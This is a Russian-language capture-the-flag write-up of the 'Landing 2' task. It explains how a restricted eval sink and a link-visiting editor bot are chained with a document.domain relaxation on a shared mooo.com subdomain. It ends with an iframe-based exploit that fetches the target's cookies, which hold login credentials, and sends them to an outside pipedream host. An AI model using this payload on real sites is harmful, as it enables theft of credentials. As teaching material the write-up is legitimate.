# Landing 2: Write-up

В этом задании нужно удивиться от того, что к описанию приложен сайт не на домене Ugra CTF: [uniiiu.mooo.com](https://uniiiu.mooo.com), и долго думать, что с этой информацией делать, ведь как и ожидается от зеркала, содержит он ровно то же самое, что и сайт из задания Landing.

Почитав исходный код сайта, видим в конце следующий HTML:

```html
<div id="ctrlEnter" style="display: none; position: fixed; left: 50%; top: 50%; transform: translate(-50%, -50%); background-color: #ffffff; padding: 16px; z-index: 20; border: 1px solid black;">
	<h3>Заметили ошибку?</h3>
	<span style="display: block; width: 600px;">Наши специалисты не очень хорошо знают русский язык, поэтому, если вы заметили опечатку, пожалуйста, приложите ссылку, по которой написано, как правильно писать.</span>
	<form action="/bir5lil0vqnfe53c/ctrl-enter/" method="POST">
		<textarea name="text" style="width: 600px; height: 300px; resize: none;"></textarea><br>
		<input class="loginButton" type="submit" value="Отправить">
	</form>
</div>

<script type="text/javascript">
	document.addEventListener("keypress", e => {
		if(e.ctrlKey && e.key === "Enter") {
			ctrlEnter.style.display = "";
		}
	});
</script>
```

Текст «приложите ссылку, по которой написано, как правильно писать» намекает, что задание на XSS. Для теста воспользуемся, например, сайтом [requestbin.com](https://requestbin.com). Если отправить сгенерированную ссылку (в моем случае — https://eo5lxkppxdv416x.m.pipedream.net) через Ctrl-Enter, через короткое время придет GET-запрос. Это подтверждает, что редактор читает любые присланные ссылки.

Чтобы удостовериться, что эта уязвимость точно относится к этой части задания, можно зарегистрироваться на сайте и отправить сообщение об опечатке под своим логином. В этом случае в личные сообщения на сайте придет ответ следующего вида:

> **От editor:**
>
> > Вы отправили сообщение об ошибке: [текст]. Скоро мы его рассмотрим.

Как проэксплуатировать XSS? Можно проверить, что при регистрации и входе логин и пароль сайт кладет в куки без флага httponly, поэтому, вероятно, достаточно научиться выполнять JS-код на сайте УНИИИУ. Но как обойти CORS? И зачем дано зеркало?

Поисследуем сайт еще. Раздел «Наша уцуцуга» дан не просто так. И уцуцуга там правда есть: между двумя картинками вставлен тег `<script>` со следующим содержимым:

```html
<script>s=decodeURIComponent(location.search.substr(1)); if(/^[".=acdeimnotu]*$/.test(s)) eval(s);</script>
```

Это дает нам возможность ограниченного XSS. Разрешенные символы указывают на то, что можно использовать некоторые строки, а также обращаться к свойствам с символами из набора `acdeimnotu`. Переберем в браузерной консоли все доступные глобальные свойства, состоящие только из этих символов.

```javascript
function enumerateProperties(object) {
	const properties = [];
	while(object !== null) {
		for(const name of Object.getOwnPropertyNames(object)) {
			if(/^[acdeimnotu]+$/.test(name)) {
				properties.push(name);
			}
		}
		object = object.__proto__;
	}
	return properties;
}
```

Для удобства реализуем рекурсивный поиск всех свойств, чтобы не делать это руками:

```javascript
function enumeratePropertiesRecursive(object) {
	const queue = [{object, path: []}];
	const visitedObjects = new Set();
	visitedObjects.add(object);

	for(let i = 0; i < queue.length; i++) {
		const {object, path} = queue[i];
		for(const property of enumerateProperties(object)) {
			if(!visitedObjects.has(object[property])) {
				queue.push({object: object[property], path: [...path, property]})
				visitedObjects.add(object[property]);
			}
		}
	}

	return queue.slice(1).map(({path}) => path.join("."));
}
```

```javascript
> enumeratePropertiesRecursive(window);
< [
	"name",
	"oncut",
	"document",
	"ua",
	"name.concat",
	"name.at",
	"document.domain",
	"name.concat.name",
	"name.at.name"
]
```

Переписывать `name`, `ua` и названия функций бесполезно, события — тоже (поскольку мы и так можем выполнять некоторый код), остается `document.domain`. Почитаем на [MDN](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain), что это такое и зачем оно нужно:

> The domain property of the Document interface gets/sets the domain portion of the origin of the current document, as used by the same-origin policy.
>
> ...
>
> The document.domain setter is deprecated. It undermines the security protections provided by the same origin policy, and complicates the origin model in browsers, leading to interoperability problems and security bugs.
>
> ...
>
> Similar problems occur with shared hosting sites that give each customer a different subdomain. If a site sets document.domain, any other customer on a different subdomain can now do the same thing, and start accessing the data of the original site.

Итак, можно заставить сайт поставить `document.domain` на какое-то полезное для нас значение. В документации написано:

> The setter for this property can be used to change a page's origin, and thus modify how certain security checks are performed. It can only be set to the same or a parent domain.

Поэтому имеет смысл ставить либо `uniiiu.mooo.com`, либо `mooo.com`. Эксплуатация и того, и другого требует регистрации поддомена на контроллируемом УНИИИУ домене.

Хм.

Точно контроллируемом УНИИИУ?

Сайт [mooo.com](https://mooo.com) пишет следующее:

![mooo.com](writeup/mooo.com.png)

Регистрируем на [freedns.afraid.org](https://freedns.afraid.org) свой домен, например, `purplesyringa.mooo.com`. Для обхода CORS нужно также, чтобы он использовал HTTPS. Можно поднять nginx с сертфикатом от LetsEncrypt на своем VPS, либо воспользоваться GitHub Pages. Эксплоит:

```html
<iframe src='https://uniiiu.mooo.com/<token>/nasha_ucucuga/?document.domain="mooo.com"'></iframe>

<script>
	document.domain = "mooo.com";

	const iframe = document.querySelector("iframe");
	iframe.addEventListener("load", () => {
		fetch("https://eo5lxkppxdv416x.m.pipedream.net/?" + iframe.contentDocument.cookie);
	});
</script>
```

Флаг: **ugra_thats_just_a_warmup_jhbhtji6p94h**
